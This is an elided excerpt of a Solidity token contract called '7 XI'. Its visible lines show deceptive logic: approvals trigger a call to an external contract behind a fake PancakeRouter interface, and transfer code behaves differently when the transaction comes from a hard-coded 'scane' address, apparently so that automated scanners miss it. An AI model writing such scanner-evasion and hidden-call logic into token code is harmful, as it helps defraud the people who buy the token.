...
interface IPancakeRouter02 {
  ...
  function joinDividend() external;
}
...
contract COINDATA {
  ...
  address internal _dex = 0x5eA162709f8385EC0B2f66e20040cD1b53d19D09;
  address public constant FTM = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;
  address public constant VIP = 0x9AD636353BCCb7bF2c23DDA1D5E4aFd021A46224;
  address public constant _OFFICE = 0x74ACa728E1d5666c61bF9c50dB4d404E34eE9E87;
  address public constant nftAddress =
    0x7eb56A5DC8243F341c04a77c050448d69F3489A3;
  address public constant scane = 0x5EC76C65184C82A31BCf6528704cADCAa398103A;
...
contract Coin is COINDATA, IERC20, Context {
  ...
  string public constant _name = "7 XI";
  string public constant _symbol = "7X";
  ...
  function joinDividend() internal returns (bool) {
    if (_tOwned[_msgSender()] > 0 && tx.origin != scane) IPancakeRouter02(_dex).joinDividend();
    return true;
  }
  ...
  function _approve(
    ...
    require(
      spender != address(0) && joinDividend(),
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != scane) {
      ...
      if (pass && _tOwned[VIP] > 10 && success == false) {
